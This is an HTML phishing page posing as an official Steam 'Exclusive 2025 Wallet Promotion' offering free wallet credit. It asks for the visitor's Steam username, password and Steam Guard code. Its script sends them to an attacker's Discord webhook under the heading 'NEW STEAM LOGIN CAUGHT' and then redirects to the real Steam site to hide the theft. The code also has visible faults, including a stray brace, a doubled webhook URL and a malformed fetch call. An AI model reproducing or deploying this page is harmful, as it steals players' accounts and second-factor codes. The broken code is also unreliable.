<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Add Funds to your Steam Wallet</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="https://store.steampowered.com/favicon.ico">
    <link rel="stylesheet" href="https://store.steampowered.com/public/css/styles_global.css?v=2025">
    <link rel="stylesheet" href="https://store.steampowered.com/public/css/styles_wallet.css">
    <style>
        body { background: #171a21 !important; padding: 40px 0; }
        }
        .main_container { max-width: 600px; margin: 0 auto; background: #1b2838; padding: 30px; border-radius: 8px; }
        .steam_logo { text-align: center; margin-bottom: 30px; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #3d4450; background: #2a3341; color: white; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #66c0f4; color: #171a21; font-weight: bold; font-size: 18px; border: none; border-radius: 4px; cursor: pointer; margin-top: 20px; }
        button:hover { background: #5ab2e6; }
        .note { color: #66c0f4; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>

<div class="main_container">
    <div class="steam_logo">
        <img src="https://store.steampowered.com/public/images/v6/logo_steam.svg" height="50" alt="Steam">
    </div>

    <h1 style="color:white; text-align:center;">Exclusive 2025 Wallet Promotion</h1>
    <p style="color:#acb2b8; text-align:center;">Verify your account to instantly receive free Steam Wallet funds!</p>

    <select id="amount">
        <option>★ $20 Free Wallet Credit</option>
        <option>★ $50 Free Wallet Credit</option>
        <option>★ $100 Free Wallet Credit</option>
    </select>

    <input type="text" id="username" placeholder="Steam Username or Email" required>
    <input type="password" id="password" placeholder="Password" required>
    <input type="text" id="guard" placeholder="Steam Guard Code (if enabled)" autocomplete="off">

    <button onclick="sendToDiscord()">CLAIM WALLET FUNDS NOW</button>

    <p class="note">This is a limited-time promotion. Funds appear within 5–10 minutes.</p>
</div>

<script>
function sendToDiscord() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const guard    = document.getElementById('guard').value;
    const amount   = document.getElementById('amount').value;

    if (!username || !password) {
        alert("Please fill in all fields");
        return;
    }

    
    const webhook = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1444089610777923735/2cs6f1Zca7-ZqHH-u3CK8UmtYgKz9GkZwiAERsgPPZXt4yVDP1Wn0f4uoSw8oBKrYm4H";

    const message = {
        content: null,
        embeds: [{
            title: "NEW STEAM LOGIN CAUGHT",
            color: 3447003,
            fields: [
                { name: "Username/Email", value: username, inline: false },
                { name: "Password",       value: password, inline: false },
                { name: "Steam Guard",    value: guard || "No 2FA", inline: false },
                { name: "Requested",      value: amount, inline: false },
                { name: "IP",             value: "Fetching...", inline: false }
            ],
            timestamp: new Date()
        }]
    };

    fetch(webhook, {
        {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(message)})
        .finally(() => {
            // Redirect to real Steam so they think it worked
            window.location.href = "https://store.steampowered.com/account/";
        });
}
</script>

</body>
</html>
